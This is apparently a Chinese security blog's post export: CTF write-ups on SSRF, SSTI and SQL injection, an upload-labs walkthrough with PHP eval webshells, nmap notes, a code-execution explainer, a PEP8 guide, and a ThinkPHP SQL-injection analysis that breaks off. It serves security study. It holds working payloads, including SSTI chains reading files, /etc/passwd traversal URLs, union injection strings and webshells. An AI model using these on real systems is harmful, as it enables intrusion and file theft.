[{"title":"SUCTF 2019-Pythonginx","url":"https://husins.cn/SUCTF-2019-Pythonginx/","content":"\n打开题目，给出一个输入框，和一部分python的源代码，没有其余可用信息，进行代码审计。\n@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def getUrl():    url = request.args.get(&quot;url&quot;)    host = parse.urlparse(url).hostname    if host == &#x27;suctf.cc&#x27;:        return &quot;我扌 your problem? 111&quot;    parts = list(urlsplit(url))    host = parts[1]    if host == &#x27;suctf.cc&#x27;:        return &quot;我扌 your problem? 222 &quot; + host    newhost = []    for h in host.split(&#x27;.&#x27;):        newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;))    parts[1] = &#x27;.&#x27;.join(newhost) #去掉 url 中的空格    finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0]    host = parse.urlparse(finalUrl).hostname    if host == &#x27;suctf.cc&#x27;:        return urllib.request.urlopen(finalUrl).read()    else:        return &quot;我扌 your problem? 333&quot;\n\n题目给了三个if 给出的判断条件 都是 一样的，但是三个if获取的host值的方法不同，而且前两个if没有什么用处，第三个if处存在读取函数。\n综合上述，我们可以得出：\n 1. 我们要绕过前两个`if`进入第三个`if`\n 2. 通过第三个`if`使用伪协议，对`flag`进行读取\n通过观察源码，我们可以发现，前面两个if都是使用urlparse或者urlsplit直接获取host，而这里偏偏使用一种特殊编码加密在解密的方式。这就是明显多此一举的行为，怀疑问题就是出现在这里。\n直接复制这个加解密字符串百度，我们能发现：\n\n使用idna编码℆之后，在使用utf-8解码，我们就能获得c/u这个字符串，也就是说当我们传入\nsuctf.c℆经过编码在解码之后我们能得到suctf.cc/u,这样的话我们就能成功绕过前面两个if进入第三个里面\n尝试读取/etc/passwd验证思路正确性\nfile://suctf.c℆/../../../../etc/passwd\n\n\n这里的题目名也是一个坑pythonginx应该是python 和 nginx\n这样的话我们直接读取nginx的关键文件即可。\n配置文件存放目录：&#x2F;etc&#x2F;nginx主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx\n\n\n读取这个文件即可\n\n","categories":["CTF题解"],"tags":["python"]},{"title":"GYCTF2020-FlaskApp","url":"https://husins.cn/GYCTF2020-FlaskApp/","content":"进入题目有三个页面，加密、解密和提示，分别对三个页面进行测试。\n\n加密功能很正常，就是正常的加密。\n\n解密输入字符或者数字会报错。\n\n提示页面除了这个图片也没什么有用信息。\n因此只能在解密处观察报错信息：\n@app.route(&#x27;/decode&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])def decode():    if request.values.get(&#x27;text&#x27;) :        text = request.values.get(&quot;text&quot;)        text_decode = base64.b64decode(text.encode())        tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())        if waf(tmp) :            flash(&quot;no no no !!&quot;)            return redirect(url_for(&#x27;decode&#x27;))        res =  render_template_string(tmp)\n\n根据报错我们发现，这里会把我们的传进去的加密字符串进行解密，其中包含waf代码应该是做了一定的过滤。因此只要我们能够绕过waf我们就可以，成功执行decode。这里回想题目是FlaskAPP,我们是不是可以做以下推论：假设这里存在SSTI注入，当我们base64编码模板语法之后，使用解密模块进行解密，是不是就能成功的将我们的数据通过解密携带出来。\n因此尝试模板语法：\n​    \n\n这里我们发现，事情好起来了呀，这里就是SSTI，通过解密将信息外带出来。\n根据报错信息我们知道文件名为app.py，因此读取源码，看看waf过滤了什么东西\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n得到waf函数的具体内容\ndef waf(str): black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] for x in black_list : if x in str.lower() : return 1 \n\n发现使用黑名单，过滤了很多的关键字，接下来的思路就很清晰了，绕过关键字过滤读取flag\n这里直接使用字符串拼接的方式进行绕过，读取根目录文件\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n\n发现flag就在根目录下，读取flag\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n\n","categories":["CTF题解"],"tags":["SSTI"]},{"title":"De1CTF 2019_SSRF Me","url":"https://husins.cn/De1CTF-2019-SSRF-Me/","content":"题目打开给出源码\n#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#x27;latin1&#x27;)app = Flask(__name__)secert_key = os.urandom(16)  # 随机生成16位的密钥class Task:    def __init__(self, action, param, sign, ip):   # 初始化，获取action， param, sign, ip(进行mad5加密)        self.action = action        self.param = param        self.sign = sign        self.sandbox = md5(ip)        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr            os.mkdir(self.sandbox)    def Exec(self):        result = &#123;&#125;        result[&#x27;code&#x27;] = 500        if (self.checkSign()):            if &quot;scan&quot; in self.action:                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;)                resp = scan(self.param)                if (resp == &quot;Connection Timeout&quot;):                    result[&#x27;data&#x27;] = resp                else:                    print resp                    tmpfile.write(resp)                    tmpfile.close()                result[&#x27;code&#x27;] = 200            if &quot;read&quot; in self.action:   # 读取文件                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;)                result[&#x27;code&#x27;] = 200                result[&#x27;data&#x27;] = f.read()            if result[&#x27;code&#x27;] == 500:                result[&#x27;data&#x27;] = &quot;Action Error&quot;        else:            result[&#x27;code&#x27;] = 500            result[&#x27;msg&#x27;] = &quot;Sign Error&quot;        return result    def checkSign(self):        if (getSign(self.action, self.param) == self.sign):            return True        else:            return False#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def geneSign():    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action = &quot;scan&quot;    return getSign(action, param)@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def challenge():    action = urllib.unquote(request.cookies.get(&quot;action&quot;))    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))    ip = request.remote_addr    if(waf(param)): # 不能出现 gophar file        return &quot;No Hacker!!!!&quot;    task = Task(action, param, sign, ip)    return json.dumps(task.Exec())@app.route(&#x27;/&#x27;)def index():    return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param):  # 对网站发起请求    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]    except:        return &quot;Connection Timeout&quot;def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return hashlib.md5(content).hexdigest()def waf(param):    check=param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return Falseif __name__ == &#x27;__main__&#x27;:    app.debug = False    app.run(host=&#x27;0.0.0.0&#x27;)\n\n是一个flask的一份网站 源码，进行代码审计。（一般来说这种题都是从路由入手）\n@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) # 给出md5拼接加密@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;]) # 解题的关键@app.route(&#x27;/&#x27;) # 给出网页源码 \n\n然后审计传参\nparam # get或者post 方式获取action # cookie获取sign # cookie获取ip # 自动获取与本题关系不大\n\n最后审计类\nclass Task 需要上述的四个传参进行初始化 获取四个参数接下来利用checksign函数对传参进行校验  跟踪checksign()发现这个函数调用getsign这个函数 让getsign的返回值等于sign的值，跟踪一下getsign函数，该函数进行了一次 hashlib.md5(secert_key + param + action).hexdigest() md5值加密并返回接下来判断 action中是否存在scan，如果存在就将 param 请求到的页面数据写入到result.txt中在判断action中是否存在read，如果存在就读取result.txt的信息\n\n结合上述分析，并结合提示 flag is in ./flag.txt可以得出\n\n首先要绕过checksign函数的检查，及 sign = hashlib.md5(secert_key + param + action).hexdigest()\naction要包含read和scan\nparam要包含请求flag.txt\n\n这里secert_key 是 随机生成的16位数，我们没有办法得到 param 和action是我们可以控制的，因此想要获取正确的MD5值就要在/geneSign入手。\n观察这个路由下面的函数，我们发现这里action=scan，和我们预计的action=readscan不太符合，那应该怎么办呢？\n解决的办法：\nhashlib.md5(secert_key + param + action).hexdigest()这里加密之前采用的字符串拼接的方式，因此代码可以这样理解string = secert_key + param + actionhashlib.md5(string).hexdigest()因此 ： string = secert_key + 123 +456 和 string = secert_key + 12345 + 6 加密之后的结果是一样的这样的话我们在路由/geneSign处构造payload ？param=flag.txtread 即可得到我们想要的sign的值即sign = 4caa41a59c8d4fff6d84d7daba784baa\n\n由此我们可以得到最终的payload\nGET /De1ta?param=flag.txt HTTP/1.1Host: a51fe3b8-0d22-47af-9ca7-d03771a57c37.node3.buuoj.cnCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Language: zh-CN,zh;q=0.9Cookie: UM_distinctid=17926f9994c8c7-00126e8d6cb0ba-d7e1739-1fa400-17926f9994daf9;action=readscan;sign=4caa41a59c8d4fff6d84d7daba784baaConnection: close\n\n还有一种hash扩展攻击的方法也能获取md5的值，这里就不在描述 贴上大佬连接，有兴趣可以看看\n","categories":["CTF题解"],"tags":["flask"]},{"title":"GXYCTF2019-BabySQli","url":"https://husins.cn/GXYCTF2019-BabySQli/","content":"知识点：\n​    当使用联合查询时，查询的数据不存在，联合查询就会暂时构造一个虚拟的数据。\n解题：\n​    \n题目页面只给了一个登陆框，经过简单的测试，页面会跳转到search.php,并且存在三种情况\n\n用户名不为admin，回显 no user\n用户名为admin，回显 wrong pass!\n输入单引号数据库报错\n\n此外查看search.php页面的源代码，存在如下注释\nMMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5\n\n base32解密得到，如下信息：\nc2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==\n\nbase64解码得到，如下信息：\nselect * from user where username = &#x27;$name&#x27;\n\n综合如上信息分析，不难看出，POST型SQL注入，而且一定存在 admin 这个用户\n使用SQLMAP 一把嗦，能够得到如下信息：\n\n​        \n尝试md5解密密码，发现密码挺复杂，根本解不出来！\n这能通过别的方式，实现登陆。\n这里就要提到联合查询时，当查询不存在的数据时，会虚拟这个数据出来。\n首先建立一个测试表\n\n执行联合查询语句\n\n我们发现联合查询的语句被成功虚拟了出来\n\n只又在查询的同时才会虚拟出来，这个虚拟是暂时的。\n因此我们可以同样来虚拟一个新的用户，进行登录,这里要结合我们sqlmap跑出来的信息，对应好字段。\n构造我们的payload\n用户处：1&#x27; union select 1,&#x27;admin&#x27;,&#x27;81dc9bdb52d04dc20036dbd8313ed055&#x27; #密码处：1234（81dc9bdb52d04dc20036dbd8313ed055解密之后的值）\n\n\n\n","categories":["CTF题解"],"tags":["SQL"]},{"title":"python之PEP8编码规范","url":"https://husins.cn/python之PEP8编码规范/","content":"Python之PEP8编码规范缩进\n每一级缩进使用四个空格\n\n续行应该与其包裹元素对其，要么使用圆括号，方括号和花括号内的隐试行连接，来垂直对其，要么使用挂行缩进对其。当使用挂行缩进时，应该考虑到第一行不应该有参数，以及使用缩进以区分自己是续行。\n推荐：\n# 隐试行连接垂直对其foo = long_function_name(var_one, var_two                         var_three, var_four)# 使用挂行缩进，第一行不存在参数，使用更多的缩进进行区分def long_function_name(\t\tvar_one,\t\tvar_two,\t\tvar_three,\t\tvar_four):    print(&#x27;挂行缩进&#x27;)\n\n不推荐：\n# 在不使用垂直对其时，禁止把参数放在第一行foo = long_function_name(var_one, var_twovar_three, var_four)# 当使用挂行缩进时，要增加缩进def long_function_name(    var_one,    var_two,    var_three,    var_four):    print(&#x27;挂行缩进&#x27;)\n\n\n\n行的最大长度\n所有行限制的最大字符数为79\n没有结构化限制的大块文本（文档字符或者注释），每行的最大字符数限制在72\n\n空行\n顶层函数和类的定义，前后使用两个空行隔开\n类里的方法定义用一个空行隔开\n\nimport导入\n导入通常在分开的行，例如：\n# 推荐import osimport sysfor subprocess import Popen, PIPE# 不推荐import sys, os\n\n导入注释位于文件的顶部，在模块注释和文档字符串之后，在模块的全局变量与常量之前。\n\n大于应该按照以下 以下顺序分组：\n\n标准库导入\n相关第三方库导入\n本地应用/库特定导入\n应该在每一组导入之间加入空行\n\n\n蚁剑使用绝对路径导入，如果导入系统没有正确的配置（比如包里的一个目录在sys.path里的路径），使用绝对路径会更加可读并且性能更好（至少能提供更好的错误信息）\n\n\n注释\n注释总览\n\n与代码相矛盾的注释比没有注释还糟，当代码更改时，优先更改对应的注释\n注释应该是完整的句子\n如果注释很短，句尾的句号可以省略。块注释一般由完整句子的一个或者多个段落组成，并且每句话结束有个句号\n在句尾结束的时候应该使用两个空格\n在非英语国家的Python程序员，请使用英文写注释，除非你120%的确信你的代码不会被使用其他语言的人阅读。\n\n\n块注释\n\n块注释永昌适用于跟随他们的某些（或全部）代码，病所进到与代码相同的级别。块注释的每一行开通使用一个#的空格分隔\n块注释内部的段落通过只有一个#的空行分隔\n\n\n行内注释\n\n有节制地使用行内注释\n行内注释是代码语句同行的注释。行内注释和代码至少有两个空格分隔。注释由#和一个空格开始\n如果状态明显的话，行内注释是不必要的，反而会分散注意力\n\n\n文档字符串\n\n等为所有的公共模板，函数，类以及方法编写文档说明\n非公共的方法没有必要，但是应该有一个描述方法具体作用的注释。这个注释应该在def哪一行之后\n多行文档说明使用的结尾三引号应该自成一行\n\n&quot;&quot;&quot;Return a foobangOptional plotz says to frobnicate the bizbaz first.&quot;&quot;&quot;\n\n\n对于单行的文档说明，尾部的三引号应该和文档在同一行\n\n\n\n命名约定\n应该避免的名字\n永远不要使用字母l,O,或者I作为单字符变量命名\n在有些字体里，这些字符无法和数字0和1区分，如果想用l,使用L替代\n\n\n类名\n类名一般使用首字母大写的约定\n在接口呗文档化并且主要被用于调用的情况下，可以使用函数的命名风格代替\n注意：大部分内置变量是单个单词（或者两个单词连接在一起)，首字母大写的命名法只用于异常名或者内部的常量\n\n\n函数名\n函数名应该小写，如果想提高可读性可以用下划线分隔\n大小写混合仅在为了兼容原来主要以大小写混合风格的情况下使用，保持向后兼容\n\n\n函数和方法参数\n始终要将self作为实例方法的第一个参数\n始终要将cls作为类静态方法的第一个参数\n如果函数的参数名和已有的关键词冲突，在最后加单一下划线比缩写或随意拼写更好。因此class_比clss更好\n\n\n\n编程建议\n代码应该用不损害其他Python实现的方式去编写。\n和像None这样的单列对象进行比较的时候应该使用用is或者is not，永远不要等号运算。\n使用 is not 运算符，而不是 not … is 。虽然这两种表达式在功能上完全相同，但前者更易于阅读，所以优先考虑。\n\n参考文档\nhttps://www.jianshu.com/p/ffcc66bab3ce\n","categories":["Python"],"tags":["python"]},{"title":"upload-labs","url":"https://husins.cn/upload-labs/","content":"\n层楼终究无少年，自由早晚乱余生。\n\n\n常用的一句话木马：\n​    &lt;!--?php @eval($_POST[&#39;cmd&#39;]);?--&gt;​    &lt;?php @eval($_POST[&#39;cmd&#39;]) ?&gt;\n​    &lt;script language=&quot;php&quot;&gt;@eval_r($_POST[cmd])&lt;/script&gt;\n​    &lt;?=eval($_POST[&#39;cmd&#39;]);\n常用文件格式\n​    Content-Type: image/png​    Content-Type: image/jpeg\n图片马合成：\n​    图片和一句话木马在同一文件夹下时，copy 1.jpg/b + 1.php/a 2.jpg  \n常用后缀名\n​    PHP: \n​        php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定) \n​    ASP： \n​        asa、cer、cdx ASPX： ascx、ashx、asac \n​    JSP： \n​        jsp、jspx、jspf\n\nPass-01\n弹窗不允许上传除图片类型外其他类型的文件。这里首先要思考是前端检测还是后端检测。最有效的办法就是F12查看网页源代码。\n\n由此可以看出，是前端校验。前端校验目前已知两种校验方式，禁用JavaScript,或者使用BurpSuite抓包修改后缀。\n禁用JavaScript比较简单这里不再演示，这里演示使用BurpSuite修改后缀\n首先我们应该将一句话木马在text中写好然后将.txt后缀在本机修改为.jpg\n\n这样文件就可以直接上传了，最后测试文件上传是否正常。\n\nPass-02\n上传1.php发现提示文件上传类型不正确，F12查看，不存在前端校验，因此应该是后端校验，尝试抓包查看。\n\n这里出现了Content-Type判断文件类型，因此应该是通过判断文件类型进行过滤，因此修改此处进行绕过。\n\n发包图片上传成功\nPass-03和Pass-04\n上传一句话木马，发现.php被禁用，也就是说这里会检测我们的后缀名，因此只要我们的后缀名不是.php即可。因此我们可以使用同样被当做PHP代码解析的后缀名、使用.htacess增加当做PHP解析的后缀名（1）、使用Apache解析漏洞（2）。\n注解：\n​    (1)：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能\n​    （2)：Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。Apache认为应该从右到左开始判断解析方法的。如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止。\n\nPass-05和Pass-10\n查看源代码，可以发现对文件名做了操作，这里只对文件进行了一次操作，因此上传后缀名为.php. .首先点和空格都被删除掉一次，这时后缀名为.php.,结合windows特性会自动去除文件后缀的点和空格，因此文件可以被当做PHP正常解析，实现绕过。\nPass-06\n这里可以用和第五题一样的方法，这里还没有强制转换为小写，因此可以使用大小写的方式进行绕过，例如上传.phP。\nPass-07\n这里文件没有首尾去除空格，因此可以使用在后缀名后面添加空格的方法进行绕过。\nPass-08\n这里没有去除文件名后面的点，因此可以使用在后缀名后面添加点的方法进行绕过。\nPass-09\n这里没有去除windows文件流(1)的过滤，因此可以使用在后缀名后面添加::$DATA的方法进行绕过。\n注解\n​    (1)：在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，它的目的就是不检查后缀名\nPass-11\n这里会将黑名单的后缀名，替换为空，而且只替换一次，因此可以使用双写的方式.pphphp来进行绕过。\nPass-12\n这里不再使用黑名单，而是开始使用白名单，并且修改了文件名。\n\n我们可以再save_path处使用%00截断(1)，?save_path=&quot;../upload/1.php%00&quot;,此时上传的文件名拼接到save_path后面文件相当于当做1.php解析实现绕过。\n注解\n​    在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。但是只存在于php5.3.4以下\nPass-13\n源代码和12题是一样的，只是save_path变成了$_POST传参，同样是%00截断，但是这次不同的是save_path在post包里面，GET是可以把url自动转码的，但是POST方式不会自动将%00编码为空字符。因此，我们需要在burp中选中%00右击-&gt;url-&gt;urldecode go即可\nPass-14和Pass-15和Pass-16\nPass-14这道题检测文件头，在一句话木马前面添加图片格式文件头，Pass-15和Pass-16上传三种类型图片马。图片马合成有两种方式：使用cmd命令进行合成，或者将图片二进制打开直接写入一句话木马。\nPass-17\n这里会将图片二次渲染（1），但是二进制打开原图片和二次渲染之后的图片，会发现有一部分是不发生改变的，只要我们在不发生改变处 写入一句话木马，即可绕过上传。\n注解\n​    二次渲染：就是根据用户上传的图片，新生成一个图片，将原始图片删除，将新图片添加到数据库中。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。\nPass-18\n根据源代码，文件名还要被修改。我们这里可以使用条件竞争来进行绕过。首先我们应该编写一个PHP文件，内容为\n&lt;?php\tfile_put_contents(&#x27;cmd.php&#x27;,&#x27;eval($_POST[&#x27;cmd&#x27;]);&#x27;);    ?&gt;\n\n使用burpsuite重复上传这个文件，然后文件重命名或者删除之前成功访问到这个文件，这个文件执行就能写入cmd.php,木马上传成功。\nPass-19程序调用了一个MyUpload类，来判断即文件的状态，和上题一样，但是程序会首先调用isUploadedFile来判断是否属于白名单，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功\nPass-20上传文件和文件名可控，且文件名是黑名单限制。文件名改为20.php/.，move_uploaded_file函数遇到/.的时候会删除它。\nPass-21对MIME和文件后缀都进行了检查。 但是取后缀的时候判断$file是不是数组，可以让$file为数组来绕过$file = explode(‘.’, strtolower($file));。最后上传的时候文件名取的是$file_name = reset($file) . ‘.’ . $file[count($file) - 1];综上，$file数组[“20.php”,””,”jpg”]，最后一个为jpg可以绕过白名单检查，文件名为:20.php.,再配合move_uploaded_file的特性，最终上传的文件名为20.php。\n","categories":["漏洞总结"],"tags":["文件上传"]},{"title":"namp常用命令","url":"https://husins.cn/namp常用命令/","content":"\n-sn只进行主机发现，不进行端口扫描\n\n\nnmap -sn 192.168.1.100/24  # 扫描C段\nnmap -sn 192.168.1.100/16 # 扫描B段，时间比C段长得多\n\n\n-p端口扫描，指定我们扫描的端口号\n\nnmap 192.168.1.100 -p 80,90\nnmap 192.168.1.100 -p 1-65535 \n\n\n-vv显示扫描细节\n\n\n-exclude：扫描除此之外的所有主机\n\n\n-excludefile：扫描除过某一个文件中的ip外的主机\n\n\n-sL：显示将要扫描的主机列表\n\n\n-sP 类似于windows/Linux系统下的ping方式扫描，常用于去扫描内网的一个 ip范围来做内网的主机发现\n\n\n-sS：SYN半开放式扫描\nTcp SYN Scan (sS) 这是一个基本的扫描方式,它被称为半开放扫描因为这种技术使得Nmap不需要通过完整的握手就能获得远程主机的信息。Nmap发送SYN包到远程主机但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势.如果Nmap命令中没有指出扫描类型,默认的就是Tcp SYN.但是它需要root/administrator权限。\nnmap -sS 192.168.1.1\n\n\n\n-sT：寻找TCP开放的端口 \nnmap -sT 192.168.1.1\n\n\n\n-sU：寻找UDP开放的端口\nnmap -sU 192.168.1.1\n\n\n\n-sV：版本检测扫描，获取扫描靶机版本信息\nnmap -sV 192.168.1.1\n\n\n\n-O：系统操作信息\nnmap -O 192.168.1.1\n\n\n\n-A：综合扫描\n\n-oG：扫描结果输出到屏幕，同时存储一份txt\n\n\n","categories":["工具使用"],"tags":["nmap"]},{"title":"浅析代码执行漏洞","url":"https://husins.cn/浅析代码执行漏洞/","content":"什么是代码执行在开发中，开发人员经常需要能灵活的插入一些代码，并且是这些代码生效，例如：\n\n系统主题模板调用\n\n灵活的逻辑判断\n&lt;?php$string = &quot;beautiful&quot;;$time = &quot;winter&quot;;$str = &#x27;This is a $string $time morning!&#x27;;echo $str. &quot;&lt;br /&gt;&quot;;eval(&quot;\\$str = \\&quot;$str\\&quot;;&quot;);echo $str;?&gt; //输入：    This is a $string $time morning!\tThis is a beautiful winter morning! \n\n\n\n漏洞产生的原因当这些代码中的参数可控的时候，恶意用户就可以插入自己想要的执行的代码（或命令），这行代码呗执行之后就造成了漏洞。\n例如：\n&lt;?php\t$a = $_GET[8];\teval($a);?&gt;\n\n\n&lt;?php\t$a = $_GET[8];\tsystem($a);?&gt;\n\n\n常见的命令/代码执行函数eval() 和 assert()\n\nmixed eval( string $code)\n把字符串code作为PHP代码执行\n\n代码不能包含打开/关闭 PHP tags。比如不能传入： &#39;&lt;?php echo &quot;Hi!&quot;; ?&gt;&#39;。但仍然可以用合适的 PHP tag 来离开、重新进入 PHP 模式。比如 &#39;echo &quot;In PHP mode!&quot;; ?&gt;In HTML mode!&lt;?php echo &quot;Back in PHP mode!&quot;;’。\n传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾。比如 &#39;echo &quot;Hi!&quot;&#39; 会导致一个 parse error，而 &#39;echo &quot;Hi!&quot;;&#39; 则会 正常运行。\n\n\nbool assert ( mixed $assertion [, string $description ] )\nPHP语言中是用来判断一个表达式是否成立，返回true or false。 \n如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。\n\n\n调用参数过滤不当\ncall_user_func()、call_user_func_array ()、 array_map ()等几十个函数都可以调用其他函数的 功能。其中一个参数为调用的函数名，如果这个传入的函数名可控，那就可以调用意外的函数来执行我们想 执行的代码。\n\nmixed call_user_func( callable $callback[, mixed $parameter[, mixed $…]] )\n第一个参数 callback是被调用的毁掉函数，其余参数是回调函数的参数，该类函数的功能是调用函数，多用在框架中动态调用函数，其余参数都是回调函数的参数\n\narray array_map( callable $callback, array $array1[, array $…] )\n返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 \narray_map() 数组数量，两者必须一样。\n\n\n动态函数执行\n由于PHP特性，PHP的函数名称可以由字符串进行拼接。\n//例子1$a = &#x27;e&#x27;.&#x27;v&#x27;.&#x27;a&#x27;.&#x27;l&#x27;;$a(&#x27;phpinfo()&#x27;);//例子2$_GET[&#x27;a&#x27;]($_POST[_]);\n\n基于该类写法变形出来的，经常被当做WEB后门使用\n漏洞的危害\n继承Web服务程序的权限去执行系统命令或读写文件。\n反弹shell\n控制整个网站甚至控制服务器。\n进一步内网渗透\n\n漏洞如何防护\n尽量不要执行外部命令。\n使用自定义函数或者函数库来代替外部命令的功能。\n使用escapeshe||arg函数来处理命令参数。\n使用safe_mode_exec_dir指定可执行文件的路径。（safe_mode_exec_dir指定路径时可以把会使用的命令提前放入此路径内。）\n使用disable_funcation()禁用危险命令\n\n","categories":["漏洞总结"],"tags":["RCE"]},{"title":"thinkPHP5.x SQL注入","url":"https://husins.cn/thinkPHP5-x-SQL注入/","content":"漏洞信息漏洞编号：CVE-2018-16385\n影响版本：ThinkPHP框架&lt;5.0.16\n漏洞类型：SQL注入漏洞\nThinkPHP基础知识ThinkPHP目录结构：\n├─application 应用目录（可设置）│ ├─common 公共模块目录（可更改）│ ├─index 模块目录(可更改)│ │ ├─config.php 模块配置文件│ │ ├─common.php 模块函数文件│ │ ├─controller 控制器目录│ │ ├─model 模型目录│ │ ├─view 视图目录│ │ └─ ... 更多类库目录│ ├─command.php 命令行工具配置文件│ ├─common.php 应用公共（函数）文件│ ├─config.php 应用（公共）配置文件│ ├─database.php 数据库配置文件│ ├─tags.php 应用行为扩展定义文件│ └─route.php 路由配置文件├─extend 扩展类库目录（可定义）├─public WEB 部署目录（对外访问目录）│ ├─static 静态资源存放目录(css,js,image)│ ├─index.php 应用入口文件│ ├─router.php 快速测试文件│ └─.htaccess 用于 apache 的重写├─runtime 应用的运行时目录（可写，可设置）├─vendor 第三方类库目录（Composer）├─thinkphp 框架系统目录│ ├─lang 语言包目录│ ├─library 框架核心类库目录│ │ ├─think Think 类库包目录│ │ └─traits 系统 Traits 目录│ ├─tpl 系统模板目录│ ├─.htaccess 用于 apache 的重写│ ├─.travis.yml CI 定义文件│ ├─base.php 基础定义文件│ ├─composer.json composer 定义文件│ ├─console.php 控制台入口文件│ ├─convention.php 惯例配置文件│ ├─helper.php 助手函数文件（可选）│ ├─LICENSE.txt 授权说明文件│ ├─phpunit.xml 单元测试配置文件│ ├─README.md README 文件│ └─start.php 框架引导文件├─build.php 自动生成定义文件（参考）├─composer.json composer 定义文件├─LICENSE.txt 授权说明文件├─README.md README 文件├─think 命令行入口文件\n\nThinkPHP助手函数：\n\n\n漏洞环境搭建PHPstudy：Apache2.4.39 + MySQL5.7.26 + PHP7.3.4nts\nPHPstrom + Xdebug\n\n数据库创建\ncreate database thinkphp;use thinkphp;create table users(    id int primary key auto_increment,    username varchar(50) not null);\n\n\n\n\n\n\napplication/index/controller/Index.php 文件代码设置\n&lt;?phpnamespace app\\index\\controller;class Index&#123;    public function index()    &#123;        $username = request()-&gt;get(&#x27;username/a&#x27;);        db(&#x27;users&#x27;)-&gt;insert([&#x27;username&#x27; =&gt; $username]);        return &#x27;Update success&#x27;;    